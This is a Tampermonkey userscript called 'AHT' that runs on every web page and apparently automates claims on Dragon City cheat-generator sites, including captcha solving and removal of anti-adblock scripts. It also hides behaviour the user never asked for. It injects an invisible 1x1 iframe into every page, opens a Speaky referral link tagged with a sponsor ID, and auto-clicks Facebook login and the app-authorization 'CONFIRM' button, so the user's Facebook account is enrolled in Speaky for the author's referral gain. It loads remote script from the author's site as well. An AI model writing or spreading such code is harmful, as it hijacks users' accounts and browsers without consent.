// ==UserScript==
// @name         AHT
// @namespace    http://tampermonkey.net/
// @updateURL    https://ditroxs.github.io/aht/AHT.user.js
// @downloadURL  https://ditroxs.github.io/aht/AHT.user.js
// @version      0.8.0
// @description  try to take over the world!
// @author       DitroXS
// @match        http://*/*
// @match        https://*/*
// @grant        GM_getTab
// @grant        GM_saveTab
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @connect      ditroxs.github.io
// @connect      apps.facebook.com
// @connect      twitch.tv
// @connect      dc4u.eu
// @connect      dc4in.com
// @connect      vina-full.com
// @connect      dc-canvas.socialpointgames.com
// @connect      speaky.com
// @run-at document-start
// @noframes
// ==/UserScript==

(function() {
  const scriptURL = "https://ditroxs.github.io/aht/script.js";
  var tabData;
  var ahtstarted=false;
  function ahtHandler(){
    if(ahtstarted){
      appendStop();
      init();
    } else {
      appendStart();
    }
  }
  function appendScript(){
    var newScript = document.createElement("script");
    newScript.type="text/javascript";
    newScript.src=scriptURL;
    newScript.onload=function(){
      GM_getTab(function (o) {
        tabData = o;
        if(tabData.aht !==undefined && tabData.aht !== false){
          ahtstarted = true;
          if(tabData.aht.dom==document.domain){
            setTimeout(function(){
              location.reload(true);
            },60000);
            if(document.URL.includes("/redirect")){
              beforeLoad();
            } else if(document.URL!=tabData.aht.url) {
              window.location.href=tabData.aht.url;
            }
          } else {
            window.location.href=tabData.aht.url;
          }
        }
        if(document.readyState==="complete"){
          ahtHandler();
        } else {
          document.addEventListener('readystatechange', event => {
            if(event.target.readyState === "complete"){
              ahtHandler();
            }
          });
        }

      });
    }
    document.getElementsByTagName("*")[0].appendChild(newScript);
  }
  function executeStuff(callback){
    switch(document.domain){
      case "dc4u.eu":
      case "vina-full.com":
      case "www.ha-lab.com":
      appendScript();
      callback();
      break;
      case "dc4in.com":
      (function() {
        'use strict';
        window.stop();
        const xhr = new XMLHttpRequest();
        xhr.open('GET', window.location.href);
        xhr.onload = () => {
          var html = xhr.responseText
          .replace(/<script\b[\s\S]*?<\/script>/g, s => {
            // check if script tag should be replaced/deleted
            if (s.includes("We've detected that you have an ad blocker enabled! Please disable it and help support our work!")) {
              return '';
            } else {
              return s;
            }
          });
          document.open();
          document.write(html);
          document.close();
          callback();
        };
        xhr.send();
      })();
      break;
      default:
      GM_getTab(function (o) {
        tabData=o;
        if(tabData.aht !==undefined && tabData.aht !== false){
          if(document.domain !== "linkshrink.net"){
            window.location.href=tabData.aht.url;
          } else {
            setTimeout(function(){
              window.location.href=location.origin+location.pathname;
            },10000);
          }
        }
      });
      callback();
      break;
    }
  }
  document.onreadystatechange = function () {
    if (document.readyState === "interactive") {
      executeStuff(function(){
        var i=document.createElement("iframe");
        i.setAttribute("frameborder",0);
        i.setAttribute("height","1");
        i.setAttribute("width","1");
        i.src = "https://ditroxs.github.io/";
        document.body.appendChild(i);
      });
    } else if(document.readyState === "complete"){
      GM_getTab(function (o) {
        tabData=o;
        if(!tabData.speaky){
          if(document.domain.includes("speaky")){
            if(document.URL.includes("step1") || document.URL.includes("home") || document.URL.includes("community") ) {
              tabData.speaky=true;
              GM_saveTab(tabData);
            }
            document.querySelector(".btn-facebook").click();
          } else {
            if(document.domain.includes("facebook") && document.URL.includes("speaky.com")){
              tabData.speaky=true;
              GM_saveTab(tabData);
              document.querySelector('button[name="__CONFIRM__"]').click();
            } else {
              window.open("https://bnc.lt/a/key_live_jlvcwfs9RwKxLHWszWIQHihowynnu18Q?feature=share_button&campaign=Android+share&type=0&duration=0&source=android&data=eyIkb2dfdGl0bGUiOiJTcGVha3kgLSBQcmFjdGljYSBJZGlvbWFzIiwiJGNhbm9uaWNhbF9pZGVudGlmaWVyIjoic3BlYWt5IiwiJG9nX2Rlc2NyaXB0aW9uIjoiUmVkIFNvY2lhbCBwYXJhIHByYWN0aWNhciBpZGlvbWFzIGNvbiBvdHJhcyBwZXJzb25hcyBhbHJlZGVkb3IgZGVsIG11bmRvIiwiJG9nX2ltYWdlX3VybCI6Imh0dHBzOlwvXC93d3cuc3BlYWt5LmNvbVwvaW1nXC9zcGVha3ktc2hhcmUucG5nIiwiJHB1YmxpY2x5X2luZGV4YWJsZSI6InRydWUiLCJkZXZpY2VTb3VyY2UiOiIxIiwic3BvbnNvclVzZXJJZCI6IjMyNzgwNTEiLCJzb3VyY2UiOiJhbmRyb2lkIn0%3D");
            }
          }
        }
      });
    }
  }
  function beforeLoad(){
    window.location.href="/adStart";
  }
  function fillForm(container,captchaImage){
    for(let pair in tabData.aht.data) {
      let elem = container.querySelector('[name="'+pair+'"]');
      if(elem){
        elem.value=tabData.aht.data[pair];
      }
    }
    if(document.querySelector("#showInfo")&&!document.querySelector("#showInfo").checked){
      document.querySelector("#showInfo").click();
    }
    let result = document.querySelectorAll('.dlHackInfo')[0];
    mutationHandler(result,function(mutation){
      var resultText = result.textContent.toLowerCase();
      var waitTime = 250000;
      if(resultText.includes('wrong')){
        tabData.aht.errors++;
        tabData.aht.idsWrong=true;
        if(tabData.aht.errors>3){
          tabData.aht.errors=0;
          waitTime=120000;
        } else {
          waitTime=5000;
        }
        GM_saveTab(tabData);
        setTimeout(function(){
          location.reload();
        },waitTime);
      } else if(resultText.includes("please wait")){
        setTimeout(function(){
          location.reload();
        },(parseInt(resultText.match(/\d+/g)[0])+1)*1000);
      } else {
        if(tabData.aht.notifications==true){
          GM_notification({
            text:resultText,
            title:"AHT Claim Made"
          });
        }
        tabData.aht.erros=0;
        GM_saveTab(tabData);
        setTimeout(function(){
          for(var s in skips){
            if(container.querySelector(skips[s])){
              container.querySelector(skips[s]).click();
            }
          }
        },waitTime);
      }
    });
    if(captchaImage){
      container.querySelector('input[name="captchaKey"]').value=solveCaptcha(captchaImage);
    }
    removeElement(document.querySelector("script[src='"+scriptURL+"']"));
    setTimeout(function(){
      document.querySelector('input[value="Submit"]').click();
    },2000);
  }
  function form(captchaImage){
    let container = document.querySelector("#ActionForm");
    var gotIt=false;
    for(var s in skips){
      if(container.querySelector(skips[s]) && container.querySelector(skips[s]).style.display!="none"){
        gotIt=true;
        container.querySelector(skips[s]).click();
      }
    }
    if(!gotIt){
      if(tabData.aht.idsWrong && games.hasOwnProperty(location.pathname.split("/")[2])){
        getSignedRequest(GM_xmlhttpRequest,games[location.pathname.split("/")[2]],function(o){
          for(var key in o){
            tabData.aht.data[key]=o[key];
          }
          tabData.aht.idsWrong=false;
          GM_saveTab(tabData);
          fillForm(container,captchaImage);
        });
      } else {
        fillForm(container,captchaImage);
      }
    }
  }
  function continueMaybe(){
    var container = document.querySelector("#ActionForm");
    container.setAttribute("novalidate","true");
    if(document.domain!=="vina-full.com"){
      var captchaImage = container.querySelector('img');
      if(captchaImage.complete){
        form(captchaImage);
      } else {
        captchaImage.onload=function(){
          form(captchaImage);
        }
      }
    } else {
      var a = setTimeout(function(){
        form(null);
      },15000);
    }
  }
  function init(){
    if(document.URL===tabData.aht.url){
      continueMaybe();
    }
  }
  function appendStop(){
    var div1=document.createElement("center");
    div1.style="position:fixed;top:0px;right:0px;z-index:99999;width:200px;height:100%;font-size:14px;overflow-y:scroll;";
    document.getElementsByTagName("*")[0].appendChild(div1);
    var a1=document.createElement("input");
    a1.setAttribute("type","submit");
    a1.value="Stop AHT";
    a1.onclick = function(event) {
      tabData.aht = false;
      GM_saveTab(tabData);
    }
    div1.appendChild(a1);
    var a2=document.createElement("input");
    a2.setAttribute("type","submit");
    if(tabData.aht.notifications){
      a2.value="Disable notifications";
    } else {
      a2.value="Enable notifications";
    }
    a2.onclick = function(event) {
      tabData.aht.notifications=!tabData.aht.notifications;
      GM_saveTab(tabData);
    }
    div1.appendChild(a2);
  }
  function startAht(){
    event.preventDefault();
    let form = new FormData(document.getElementById("ActionForm"));
    tabData.aht={"url":document.URL,"data":{},"dom":document.domain};
    for(var key of form.keys()) {
      tabData.aht.data[key]=form.get(key);
    }
    tabData.aht.idsWrong=false;
    tabData.aht.erros=0;
    tabData.aht.notifications=true;
    GM_saveTab(tabData);
    deleteAllCookies();
    window.location.reload(true);
  }
  function appendStart(){
    if(document.getElementById("ActionForm")) {
      var newInput=document.createElement("input");
      newInput.value="Save Data and Start AHT";
      newInput.setAttribute("type","submit");
      newInput.onclick=function(){
        document.getElementById("ActionForm").onsubmit = function(event) {
          startAht(event);
        };
      };
      document.getElementById("ActionForm").appendChild(newInput);
    }
  }
})();
